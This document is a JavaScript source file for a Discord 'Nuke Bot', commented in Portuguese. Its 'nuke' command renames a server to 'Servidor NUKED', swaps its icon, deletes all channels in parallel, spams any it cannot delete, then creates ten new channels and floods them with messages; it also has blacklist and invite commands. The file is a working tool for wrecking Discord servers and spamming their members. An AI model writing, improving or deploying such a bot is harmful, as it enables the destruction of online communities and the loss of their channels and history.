require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const PREFIX = 'P.';
let blacklist = []; // Lista de IDs de usuários na blacklist

client.once('ready', () => {
  console.log('✅ Bot online!');
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith(PREFIX) || message.author.bot) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // **Comando de Nuke**
  if (command === 'nuke') {
    if (!message.guild) return;
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const guild = message.guild;

    try {
      // **1️⃣ Trocar o nome e a foto do servidor**
      await guild.setName('Servidor NUKED');
      console.log('✅ Nome do servidor alterado para "Servidor NUKED".');
      
      // Substitua com a URL da imagem desejada
      const newAvatar = 'https://example.com/nuked-avatar.png';
      await guild.setIcon(newAvatar);
      console.log('✅ Foto do servidor alterada.');

      // **2️⃣ Apagar todos os canais possíveis em paralelo**
      await Promise.all(
        guild.channels.cache.map(async (channel) => {
          try {
            await channel.delete();
            console.log(`✅ Canal '${channel.name}' apagado.`);
          } catch (error) {
            console.log(`❌ Não foi possível apagar '${channel.name}', spammando nele...`);
            for (let j = 0; j < 10; j++) {
              channel.send(`💥 **Nuke ativado!**`).catch(() => {});
            }
          }
        })
      );

      // **3️⃣ Criar e spammar em novos canais em paralelo**
      const spamMessages = Array(10).fill('🚀 **Nuke ativado!**');
      await Promise.all(
        Array(10).fill().map(async (_, i) => {
          try {
            const newChannel = await guild.channels.create({
              name: `nuke-${i + 1}`,
              type: 0
            });

            await Promise.all(spamMessages.map(msg => newChannel.send(msg).catch(() => {})));
            console.log(`✅ Canal '${newChannel.name}' criado.`);
          } catch (err) {
            console.error('❌ Erro ao criar canal:', err);
          }
        })
      );

      await message.reply('💥 **Nuke finalizado!** Tudo foi apagado ou recebeu spam.');
    } catch (error) {
      console.error('❌ Erro ao executar nuke:', error);
    }
  }

  // **Comando de Blacklist**
  if (command === 'blacklist') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const target = message.mentions.users.first();
    if (!target) {
      return message.reply('❌ Mencione um usuário para adicionar à blacklist.');
    }

    if (blacklist.includes(target.id)) {
      return message.reply('❌ Este usuário já está na blacklist.');
    }

    blacklist.push(target.id);
    message.reply(`✅ O usuário ${target.tag} foi adicionado à blacklist.`);
  }

  // **Comando de Invite**
  if (command === 'invite') {
    const embed = new EmbedBuilder()
      .setTitle('👑 Convite para o servidor')
      .setDescription('Clique [aqui](https://discord.com/oauth2/authorize?client_id=SEU_CLIENT_ID&scope=bot&permissions=BOT_PERMISSIONS) para adicionar o bot ao seu servidor!')
      .setColor('BLUE')
      .setFooter('Nuke Bot', client.user.displayAvatarURL());

    message.reply({ embeds: [embed] });
  }

  // **Prevenir Blacklist no Comando**
  if (blacklist.includes(message.author.id)) {
    return message.reply('❌ Você está na blacklist e não pode interagir com o bot.');
  }
});

client.login(TOKEN);
